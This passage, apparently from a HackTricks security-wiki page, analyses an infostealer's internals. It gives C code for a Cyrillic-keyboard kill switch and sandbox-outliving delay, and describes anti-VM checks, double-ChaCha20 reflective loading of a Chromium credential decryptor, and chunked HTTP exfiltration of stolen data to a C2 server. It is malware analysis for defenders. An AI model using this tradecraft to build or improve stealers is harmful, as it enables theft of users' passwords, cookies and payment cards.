- A config flag (`anti_cis`) enumerates installed keyboard layouts via `GetKeyboardLayoutList`. Ako se pronađe ćirilični layout, sample ostavlja prazan `CIS` marker i terminira pre pokretanja stealera, osiguravajući da se nikada ne detonira na isključenim lokalitetima dok ostavlja hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Višeslojna `check_antivm` logika

- Variant A prolazi kroz listu procesa, hešira svako ime sa custom rolling checksum i upoređuje ga protiv ugrađenih blocklists za debuggers/sandboxes; ponavlja checksum i nad imenom računara i proverava radne direktorijume kao što su `C:\analysis`.
- Variant B ispituje sistemska svojstva (donja granica broja procesa, recent uptime), poziva `OpenServiceA("VBoxGuest")` da detektuje VirtualBox additions, i izvodi timing checks oko sleep poziva da otkrije single-stepping. Bilo koji pogodak abortira pre pokretanja modula.

### Fileless helper + double ChaCha20 reflective loading

- The primary DLL/EXE embeds a Chromium credential helper that is either dropped to disk or manually mapped in-memory; fileless mode resolves imports/relocations itself so no helper artifacts are written.
- That helper stores a second-stage DLL encrypted twice with ChaCha20 (two 32-byte keys + 12-byte nonces). After both passes, it reflectively loads the blob (no `LoadLibrary`) and calls exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derived from [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- The ChromElevator routines use direct-syscall reflective process hollowing to inject into a live Chromium browser, inherit AppBound Encryption keys, and decrypt passwords/cookies/credit cards straight from SQLite databases despite ABE hardening.


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` iterates a global `memory_generators` function-pointer table and spawns one thread per enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Each thread writes results into shared buffers and reports its file count after a ~45s join window.
- Once finished, everything is zipped with the statically linked `miniz` library as `%TEMP%\\Log.zip`. `ThreadPayload1` then sleeps 15s and streams the archive in 10 MB chunks via HTTP POST to `http://<C2>:6767/upload`, spoofing a browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Each chunk adds `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>`, and the last chunk appends `complete: true` so the C2 knows reassembly is done.

## Reference

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
